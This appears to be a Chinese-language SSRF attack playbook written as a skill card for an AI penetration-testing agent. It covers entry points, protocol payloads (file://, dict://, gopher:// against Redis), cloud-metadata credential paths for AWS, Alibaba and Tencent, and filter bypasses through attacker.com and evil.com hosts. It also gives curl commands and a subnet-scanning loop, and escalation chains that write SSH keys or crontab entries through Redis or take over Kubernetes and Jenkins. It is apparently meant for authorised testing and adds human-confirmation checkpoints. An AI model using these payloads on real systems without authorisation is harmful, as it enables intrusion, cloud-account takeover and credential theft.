---
name: ssrf
description: SSRF Light Deep Card — 协议路由 / 11 类入口 / 云元数据 / 内网探测 / 绕过 + 升级链。深度 gopher/dict payload 走 ssrf-scenarios.md + payload-construction。
category: vuln
tags: [server, ssrf, cloud-metadata, internal-network]
---

# SSRF (Server-Side Request Forgery) — Light Deep Card

> **CWE**: 918 | **OWASP**: A10:2021 (SSRF) | **ROI**: 极高 (P0 — 云元数据 → AK/SK → 接管)
> **轻便原则**: 路由 + 协议 + 云元数据 + 内网 + 绕过 + 升级链;深度 gopher/dict 构造 → [../payload-construction/ssrf-construction.md](../payload-construction/ssrf-construction.md);场景细节 → [ssrf-scenarios.md](ssrf-scenarios.md)。

---

## 1. First-pass Signal

| 信号 | 判断 | 下一步 |
| :--- | :--- | :--- |
| URL 参数 (`url=` / `path=` / `img=` / `callback=` / `src=` / `refer=` / `redirect=`) | SSRF 入口 | §3 协议路由 |
| 文件导入 / 图片代理 / PDF 生成 / 截图功能 | SSRF 高概率入口 | §3 |
| Webhook / 回调 URL / OAuth callback | SSRF 入口 (常盲) | §4 盲 SSRF |
| 响应包含外部资源内容 (HTML 片段 / 图片 binary) | SSRF 确认 | §5 云元数据 |
| 响应时间差异 (内网 vs 外网 IP) | 盲 SSRF | §4 |
| 错误信息含内网 IP / 内部域名 | SSRF 命中 (信息泄露) | §6 内网探测 |

记录三要素: `HTTP_CODE` / `RESP_LENGTH_DELTA` / `TIMING_DELAY`。

---

## 2. Attack Surface (常见入口)

| 入口类型 | 例子 | 备注 |
| :--- | :--- | :--- |
| **URL 参数直接** | `?url=` `?fetch=` `?proxy=` | 最常见 |
| **图片/媒体代理** | `?img=https://...` `?avatar=` | 头像 / 缩略图 |
| **PDF / HTML2Image** | "生成报告"接口 | wkhtmltopdf / Headless Chrome 漏洞最多 |
| **文件导入** | "URL 导入数据" | Excel / CSV / XML / JSON 导入 |
| **Webhook 配置** | "添加自定义 webhook" | 用户提交,系统调用 |
| **OAuth `redirect_uri`** | callback URL | 配合 Open Redirect |
| **OAuth `jwks_uri` / `request_uri`** | JWT 类 | OIDC 特殊入口 |
| **XML / SVG 上传** | `<image href="...">` | XXE 衍生 |
| **API Gateway 反向代理** | `/proxy/{url}` | 内部 API 转发 |
| **Markdown 渲染** | 图片 ![](url) 后端渲染 | 部分服务端 fetch |
| **第三方 RSS / IFTTT** | URL 订阅 | 自动周期 fetch |
| **DNS Lookup / Whois 查询** | "查询域名"接口 | DNS 不算 HTTP 但同概念 |
| **HTML 解析 (Open Graph)** | URL 预览 (Slack-like) | 服务端 fetch + 解析 |

---

## 3. 协议路由

### 3.1 First-pass 探测顺序

| 协议 | 用途 | 示例 |
| :--- | :--- | :--- |
| `http://` / `https://` | 基础探测 | `http://127.0.0.1` |
| `file://` | 本地文件读取 | `file:///etc/passwd` |
| `dict://` | 服务指纹 | `dict://127.0.0.1:6379/INFO` |
| `gopher://` | 精确构造请求 (TCP 任意) | `gopher://127.0.0.1:6379/_SET%20key%20value` |
| `ftp://` | FTP / 老服务 | `ftp://internal-server` |
| `ldap://` | LDAP 注入 / OOB | `ldap://attacker.com/` |
| `jar://` | Java 特殊 | `jar:http://...!/path` |
| `netdoc://` | Java 老式文件读 | `netdoc:///etc/passwd` |

### 3.2 判断流程

```
1. 先测 http://127.0.0.1 → 响应差异 → SSRF 确认
2. 测 http://8.8.8.8 → 对比响应时间 (内网快,外网慢)
3. 确认后 → 立即测云元数据 (§5)
4. 内网端口扫描 (§6) → 找 Redis / ES / K8s
5. 协议升级 (§3.1) → file/gopher/dict 扩攻击面
```

---

## 4. 盲 SSRF (Blind SSRF)

### 4.1 DNS OOB

```
url=http://<random>.your-oast.tld/test
```

DNS 收到查询 → SSRF 确认。OOB 通道 → [../oob-infrastructure.md](../oob-infrastructure.md)。**禁止默认用公共 dnslog.cn,走 P3.5 协议向用户索取**。

### 4.2 Time-based

```
url=http://127.0.0.1:80    → 快速响应
url=http://192.168.1.1:80  → 内网响应
url=http://8.8.8.8:81      → 超时
```

端口开放 → 快速;关闭 → 超时。借此盲扫内网。

### 4.3 Webhook / Callback 差异

部分 SSRF 在 Webhook 回调时才有输出 → 检查回调接收的 HTTP 请求头 / Body / Source IP。

---

## 5. 云元数据 (最高 ROI)

确认 SSRF 后**首选**测试云元数据。完整 endpoint + 各云 Header + AK/SK 提取 → [../cloud-security.md §1](../cloud-security.md)。

| 云 | 元数据 IP | 关键路径 |
| :--- | :--- | :--- |
| AWS | 169.254.169.254 | `/latest/meta-data/iam/security-credentials/` |
| 阿里云 | 100.100.100.200 | `/latest/meta-data/ram/security-credentials/` |
| 腾讯云 | 169.254.0.23 | `/latest/meta-data/cam/security-credentials/` |
| Azure | 169.254.169.254 | `/metadata/instance?api-version=...` |
| GCP | 169.254.169.254 / metadata.google.internal | `/computeMetadata/v1/` (需 Header `Metadata-Flavor: Google`) |
| Huawei | 169.254.169.254 | `/openstack/latest/meta_data.json` |

**拿到 AK/SK / 临时 Token**: Critical → HITL 确认后续操作边界 (走 [technologies/alibaba-cloud.md](../technologies/alibaba-cloud.md) / [tencent-cloud.md](../technologies/tencent-cloud.md))

---

## 6. 内网探测

### 6.1 高价值内网目标

| 目标 | 默认端口 | 检查 |
| :--- | :--- | :--- |
| Redis | 6379 | 未授权 → 写 crontab / SSH key (HITL) |
| Memcached | 11211 | 未授权 stats / 反射放大 |
| MySQL | 3306 | gopher 构造查询 |
| PostgreSQL | 5432 | gopher 构造 |
| MongoDB | 27017 | 未授权 listDatabases |
| Elasticsearch | 9200 | `/_cat/indices` `/_cluster/state` |
| Kibana | 5601 | 未授权访问 |
| Kubernetes API | 10250 / 6443 | `/pods` / `/nodes` |
| Docker API | 2375 / 2376 | `/containers/json` |
| Consul | 8500 | `/v1/agent/services` |
| Nacos | 8848 | 默认凭证 / 未授权 |
| Zookeeper | 2181 | `stat` 命令 |
| RabbitMQ | 15672 | `guest/guest` |
| Jenkins | 8080 | `/script` console |
| Internal API gateway | 80 / 443 / 8080 / 8443 | 业务相关 |

### 6.2 网段扫描

```
http://192.168.1.{1-254}
http://10.0.0.{1-254}
http://172.16.{0-255}.1
```

**OPSEC**: 长扫描 → `run_in_background` + HITL 确认范围。

---

## 7. Bypass Techniques

| 过滤 | 绕过 |
| :--- | :--- |
| 拦 `127.0.0.1` | `0x7f000001` / `0177.0.0.1` (八进制) / `[::1]` / `0.0.0.0` / `localhost` |
| 拦 内网 IP | DNS 重绑定 (`a.b.c.d` → 127.0.0.1) / 302 跳转 |
| 拦 `http://` | `gopher://` / `dict://` / `file://` / `ldap://` |
| URL 白名单 | `@` 绕过: `http://whitelist@evil.com` / 302 跳转 / DNS Wildcard |
| 域名黑名单 | 短链接 / IP 短格式 (`0x7f.0.0.1`) / IPv6 映射 (`::ffff:127.0.0.1`) |
| 解析两次差异 (TOCTOU) | DNS 重绑定 — 第一次解析白,第二次解析 127.0.0.1 |
| 拦 `localhost` | `localtest.me` 等公共 wildcard / `127.0.0.1.nip.io` |
| URL 解析器差异 | curl vs Java vs Python urlopen 各不同 — 试 `http://[::]:80` |
| 拦元数据 IP | 直接 IP 不行试域名: `metadata.google.internal` |

### 7.1 经典绕过组合

```
# 用户输入 → 被解析为 a.b.c
# 检查白名单是 a.b.c.com → 通过
# 实际请求 http://a.b.c.com.attacker.com → SSRF

# 双重解析差异
?url=http://expected.com#@127.0.0.1/
?url=http://expected.com.attacker.com/
?url=http://localhost.attacker.com/   # DNS 解析到 127.0.0.1

# Open Redirect 助攻
?url=https://trusted.com/redirect?to=http://169.254.169.254/
```

---

## 8. Testing Methodology

```bash
# Step 1: 入口枚举 (Phase 2)
# 找 URL 参数类入口
curl https://target/import?url=http://OOB-tracker.tld/probe

# Step 2: First-pass (无 OOB 情况)
curl https://target/import?url=http://127.0.0.1
curl https://target/import?url=http://127.0.0.1:6379    # Redis 端口
# 看响应差异

# Step 3: 协议探测 (§3)
curl https://target/import?url=file:///etc/passwd
curl https://target/import?url=dict://127.0.0.1:6379/INFO

# Step 4: 云元数据 (§5)
curl https://target/import?url=http://169.254.169.254/latest/meta-data/
curl https://target/import?url=http://100.100.100.200/latest/meta-data/
curl https://target/import?url=http://169.254.0.23/latest/meta-data/

# Step 5: 绕过 (§7)
curl 'https://target/import?url=http://expected.com@169.254.169.254/'

# Step 6: 内网端口扫 (§6, run_in_background)
for ip in 192.168.1.{1..254}; do
  curl --max-time 2 "https://target/import?url=http://$ip:6379" &
done
```

---

## 9. Triage

| 现象 | 可能原因 | 下一步 |
| :--- | :--- | :--- |
| 请求无响应 / 超时 | SSRF 出口受限 / 防火墙 | 试 DNS OOB;试不同协议 |
| 响应是外网页面 | SSRF 可出网 | 测内网;测云元数据 |
| 响应与直接访问目标不同 | WAF/代理修改 Header | 看 Server / Date / 中间件特征 |
| 只能 HTTP/HTTPS | 协议限制 | 302 跳转到 gopher:// |
| 302 跳转被阻止 | 不跟随重定向 | 试直接 gopher / DNS 重绑定 |
| 内网 IP 被拦 | URL 解析后过滤 | §7 绕过表 |
| 元数据 IP 拦但 localhost 不拦 | 不智能过滤 | `localhost.attacker.com` → 169.254.169.254 |

---

## 10. False Positives

| 误报 | 真实判断 |
| :--- | :--- |
| 响应总是相同 | 服务端直接返回固定内容,不真 fetch | 用 OOB 验证是否真发出请求 |
| Time delay 但内容不变 | 可能是 timeout 等待 | 改用 OOB |
| OOB 命中但请求来源不是目标 IP | 可能是 DNS cache / 中间 resolver | 看 OOB 接收端 source IP |
| 元数据返回 200 但 Body 空 | IMDSv2 需要 PUT Token / Metadata-Flavor Header | 加 Header 重试 |
| 响应含 "internal error" 关键字 | 不一定是 SSRF,可能 URL parse 报错 | OOB 验证 |

---

## 11. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| SSRF → 云元数据 → AK/SK | 接管云账号 → 全资产 | Critical |
| SSRF → Redis 未授权 → SSH key 写 | 服务器登录 (HITL) | Critical |
| SSRF → 内网 K8s API → 接管集群 | 集群级 RCE | Critical |
| SSRF → 内网 Spring Actuator → /env | 凭证泄露 | Critical |
| SSRF → 内网 Jenkins /script | RCE | Critical |
| SSRF → file:// | 任意文件读 (含 /etc/shadow 需 root) | High |
| SSRF + Open Redirect | 绕白名单 | High |
| SSRF → gopher → SMTP | 内网钓鱼邮件 | Medium |
| SSRF → 内网 DNS Lookup | 内网拓扑测绘 | Medium |
| 盲 SSRF (DNS only) | 仅证明存在 | Medium-Low |

**证据 (P3.5)**:
- 云元数据返回的 AK 不要直接用 → HITL 让用户确认是否真测 `aliyun sts GetCallerIdentity`
- 内网服务发现先**只读 + OOB** 证明,RCE/写操作 HITL
- file:// 读 /etc/passwd 截图前 3-5 行脱敏即可

---

## 12. Pro Tips

- **入口枚举不要漏图片/PDF**: `wkhtmltopdf` / `headless Chrome` 类导出功能,内部用 `<img src>` 加载 → 经典 SSRF
- **Webhook 配置接口高产**: 业务允许用户配置 URL 收回调 → 100% SSRF 入口
- **OAuth `request_uri` 现代攻击面**: OIDC 1.0 允许 `request_uri` 参数 → fetch JWT — 老接口常忽略 SSRF 检查
- **DNS 重绑定时间窗**: 设置 TTL=0,第一次解析返回白 IP,第二次返回 127.0.0.1
- **元数据 IMDSv2 Token 不要忘**: AWS IMDSv2 默认开 → 先 PUT 拿 Token 再 GET (但很多业务侧不传 PUT,试 v1)
- **gopher payload 必带正确编码**: `\r\n` → `%0d%0a`,`\n` → `%0a`,空格 → `%20`
- **跨服务侧不一致**: SSRF 入口侧 URL 解析 vs 后端 fetch 解析 — 大概率不一致 → 经典 bypass 点
- **国内云元数据**: 阿里 `100.100.100.200` / 腾讯 `169.254.0.23` 与 AWS 不同,**一定都试**
- **HTTPS 元数据**: 部分云有 https 版,自签证书可能被拒 → 看错误信息
- **响应里看不到内容?**: 看响应 size / 看 Header (Content-Length / 中间件特征) / 看 timing — 间接确认
- **SSRF + Content-Type 转换**: 拉回 XML 内容 → XXE / 拉回 HTML → 渲染时执行 JS (取决于业务)

---

## 13. 工具升级线

**classic 版**:
- 自动化: `SSRFmap` / 手 curl + OOB 域
- 内网扫: `proxychains` + `nmap`
- gopher 构造: `gopherus` (社区工具)

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次 sweep 多协议 + 多绕过 + 多内网目标
- `mcp__yaklang__exec_codec` 构造 gopher payload (URL 编码链)
- `mcp__yaklang__query_oob_record` 自建 OOB 收回调,不走公共 dnslog
- `mcp__chrome__chrome_network_request` 直接 fetch 验证 SSRF 响应

---

## 14. 相关参考

- 构造思路: [../payload-construction/ssrf-construction.md](../payload-construction/ssrf-construction.md)
- 场景细节: [ssrf-scenarios.md](ssrf-scenarios.md)
- 云安全: [../cloud-security.md](../cloud-security.md)
- 阿里云专项: [../technologies/alibaba-cloud.md](../technologies/alibaba-cloud.md)
- 腾讯云专项: [../technologies/tencent-cloud.md](../technologies/tencent-cloud.md)
- OOB 通道: [../oob-infrastructure.md](../oob-infrastructure.md)
- 信息收集 (后端站): [../recon.md](../recon.md)
- WAF 绕过: [../waf-bypass.md](../waf-bypass.md)
- XXE (协议关联): [xxe.md](xxe.md)
- 命令注入 (RCE 终态): [cmdi.md](cmdi.md)
- 文件读 / 路径穿越: [path-traversal.md](path-traversal.md)
